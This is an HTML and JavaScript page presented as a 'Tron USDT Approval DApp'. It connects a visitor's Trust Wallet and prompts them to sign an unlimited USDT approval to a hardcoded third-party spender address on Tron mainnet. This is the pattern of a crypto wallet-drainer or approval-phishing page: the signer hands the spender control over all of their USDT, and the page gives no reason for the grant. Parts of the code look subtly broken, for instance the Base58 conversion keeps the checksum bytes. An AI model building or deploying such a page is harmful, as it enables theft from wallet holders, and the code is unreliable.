<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tron USDT Approval DApp</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f4f6f8;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h1 { margin-top: 0; color: #333; font-size: 1.5rem; }
        p { color: #666; font-size: 0.9rem; margin-bottom: 20px; }
        
        button {
            background-color: #337ab7;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 1rem;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
            margin-bottom: 10px;
        }
        button:hover { background-color: #286090; }
        button:disabled { background-color: #ccc; cursor: not-allowed; }
        
        .secondary-btn {
            background-color: #28a745;
        }
        .secondary-btn:hover { background-color: #218838; }

        #status {
            margin-top: 15px;
            font-size: 0.85rem;
            color: #d9534f;
            min-height: 20px;
            word-break: break-all;
        }
        .info-box {
            background: #e9ecef;
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 15px;
            font-size: 0.8rem;
            text-align: left;
        }
        .info-row { display: flex; justify-content: space-between; margin-bottom: 4px; }
        .label { font-weight: bold; color: #333; }
    </style>
</head>
<body>

<div class="container">
    <h1>Tron USDT Approval</h1>
    <p>Connect Trust Wallet to approve unlimited spending.</p>

    <div class="info-box">
        <div class="info-row">
            <span class="label">Network:</span>
            <span>Tron Mainnet</span>
        </div>
        <div class="info-row">
            <span class="label">Token:</span>
            <span>USDT (TR7NH...)</span>
        </div>
        <div class="info-row">
            <span class="label">Spender:</span>
            <span>TSDcg...XLV</span>
        </div>
    </div>

    <!-- Web3Modal Target Element -->
    <w3m-button></w3m-button>

    <div id="actionSection" style="display:none; margin-top: 20px;">
        <button id="btnApprove" class="secondary-btn">Approve Unlimited USDT</button>
    </div>

    <div id="status"></div>
</div>

<!-- Import Map for Ethers and Web3Modal -->
<script type="importmap">
    {
        "imports": {
            "ethers": "https://unpkg.com/ethers@6.7.0/dist/esm/ethers.min.js",
            "@web3modal/ethers": "https://unpkg.com/@web3modal/ethers@5.0.0/dist/esm/index.js"
        }
    }
</script>

<script type="module">
    import { createWeb3Modal, defaultConfig, getWeb3Modal } from '@web3modal/ethers';
    import { BrowserProvider, Contract } from 'ethers';

    // 1. Project ID from WalletConnect
    const projectId = '171db6da15a54effc1b4a06f889a3c3f';

    // 2. Tron Mainnet Configuration
    // Chain ID: 728126428 (Decimal) -> 0x2b6653dc (Hex)
    const tronMainnet = {
        chainId: 728126428,
        name: 'Tron',
        currency: 'TRX',
        explorerUrl: 'https://tronscan.org',
        rpcUrl: 'https://api.trongrid.io'
    };

    // 3. Metadata
    const metadata = {
        name: 'Tron DApp',
        description: 'Approve USDT on Tron',
        url: 'https://tron.network',
        icons: ['https://cryptologos.cc/logos/tusd-tusd-logo.png']
    };

    // 4. Create Web3Modal
    createWeb3Modal({
        ethersConfig: defaultConfig({ metadata }),
        chains: [tronMainnet],
        projectId,
        enableAnalytics: true,
        // Trust Wallet ID to prioritize it in the list
        featuredWalletIds: ['c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96']
    });

    // --- Constants ---
    const USDT_CONTRACT_BASE58 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const SPENDER_BASE58 = 'TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV';
    const APPROVE_SELECTOR = '0x095ea7b3';
    // Unlimited Amount (Max Uint256)
    const UNLIMITED_AMOUNT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

    // --- Helper: Tron Base58 to Hex ---
    // Tron addresses are Base58Check encoded. We need to convert to Hex for Ethers.js/Web3
    function tronBase58ToHex(base58Address) {
        const alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
        let bigInt = BigInt(0);
        
        // Decode Base58
        for (let i = 0; i < base58Address.length; i++) {
            const charIndex = alphabet.indexOf(base58Address[i]);
            if (charIndex === -1) throw new Error('Invalid Base58 character');
            bigInt = bigInt * BigInt(58) + BigInt(charIndex);
        }

        let hex = bigInt.toString(16);
        // Pad to ensure even length
        if (hex.length % 2 !== 0) hex = '0' + hex;

        // Tron addresses start with 0x41. EVM addresses are 20 bytes (40 hex chars).
        // We strip the '41' prefix to get the raw 20-byte address.
        if (hex.startsWith('41')) {
            hex = hex.substring(2);
        }
        
        return '0x' + hex;
    }

    // --- Logic ---
    const btnApprove = document.getElementById('btnApprove');
    const statusDiv = document.getElementById('status');
    const actionSection = document.getElementById('actionSection');
    const w3mButton = document.querySelector('w3m-button');

    // Monitor Connection State
    // Note: Web3Modal handles the UI state of the button, we just need to listen for changes to show our custom button
    window.addEventListener('load', () => {
        const modal = getWeb3Modal();
        modal.subscribeProvider((state) => {
            if (state.isConnected) {
                actionSection.style.display = 'block';
                statusDiv.innerText = '';
            } else {
                actionSection.style.display = 'none';
            }
        });
    });

    btnApprove.addEventListener('click', async () => {
        try {
            statusDiv.innerText = "Preparing transaction...";
            const modal = getWeb3Modal();
            const provider = new BrowserProvider(modal.getProvider());
            
            // Ensure correct network (Tron)
            // Web3Modal usually handles chain switching, but we double check
            const network = await provider.getNetwork();
            if (Number(network.chainId) !== 728126428) {
                statusDiv.innerText = "Error: Please switch to Tron Mainnet in Trust Wallet.";
                return;
            }

            const signer = await provider.getSigner();
            const userAddress = await signer.getAddress();

            // Convert Addresses
            const tokenAddressHex = tronBase58ToHex(USDT_CONTRACT_BASE58);
            const spenderAddressHex = tronBase58ToHex(SPENDER_BASE58);

            // Build Approval Data
            // function approve(address spender, uint256 amount)
            // selector (4 bytes) + spender (32 bytes) + amount (32 bytes)
            const data = 
                APPROVE_SELECTOR + 
                spenderAddressHex.slice(2).padStart(64, '0') + 
                UNLIMITED_AMOUNT.slice(2).padStart(64, '0');

            statusDiv.innerText = "Check Trust Wallet to sign transaction...";

            // Send Transaction
            const tx = {
                to: tokenAddressHex,
                data: data,
                value: 0 // No TRX sent
            };

            const txResponse = await signer.sendTransaction(tx);
            
            statusDiv.innerText = `Transaction Sent! Hash: ${txResponse.hash}`;
            console.log("Tx Hash:", txResponse.hash);

        } catch (error) {
            console.error(error);
            statusDiv.innerText = "Error: " + (error.reason || error.message || "User rejected or connection lost");
        }
    });
</script>

</body>
</html>
